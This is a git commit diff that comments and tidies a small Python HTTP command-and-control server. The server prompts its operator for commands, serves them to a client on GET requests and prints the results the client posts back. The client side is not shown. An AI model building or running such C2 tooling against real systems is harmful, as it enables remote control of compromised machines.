16c587cb11a6962783ba8036a697a0c5942d0e71
JJcoded <jjcoded.mail@gmail.com>
2024-10-25 13:29:32 +1000

    Update server.py

--- server.py
+++ server.py
@@ -1,20 +1,23 @@
 import http.server
-import socket
 
-HOST_NAME = "192.168.15.16"
-PORT_NUMBER = 8080  # Use an available port
+HOST_NAME = "192.168.15.16"  # Your WiFi IP
+PORT_NUMBER = 8080  # Changed port to 8080
 
 class HTTPHandler(http.server.BaseHTTPRequestHandler):
     
     def do_GET(self):
+        # Ask for C2 command to send to the client
         c2_command = input('[Server] Enter command to send to the client: ')
+        # Send response headers
         self.send_response(200)
         self.send_header('Content-Type', 'text/html')
         self.end_headers()
+        # Send the command to the client
         self.wfile.write(c2_command.encode())
         print(f'[Server] Command sent: {c2_command}')
     
     def do_POST(self):
+        # Receive and display the client's POST response
         self.send_response(200)
         self.end_headers()
         length = int(self.headers['Content-Length'])
@@ -23,16 +26,10 @@ class HTTPHandler(http.server.BaseHTTPRequestHandler):
 
 if __name__ == '__main__':
     server_class = http.server.HTTPServer
-
-    # Create the server object
     httpd = server_class((HOST_NAME, PORT_NUMBER), HTTPHandler)
-    
-    # Enable SO_REUSEADDR to prevent the address already in use issue
-    httpd.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    
-    print(f'[Server] Starting server at {HOST_NAME}:{PORT_NUMBER}')
-    
+
     try:
+        print(f'[Server] Starting server at {HOST_NAME}:{PORT_NUMBER}')
         httpd.serve_forever()
     except OSError as e:
         print(f'[Server Error] {e}')
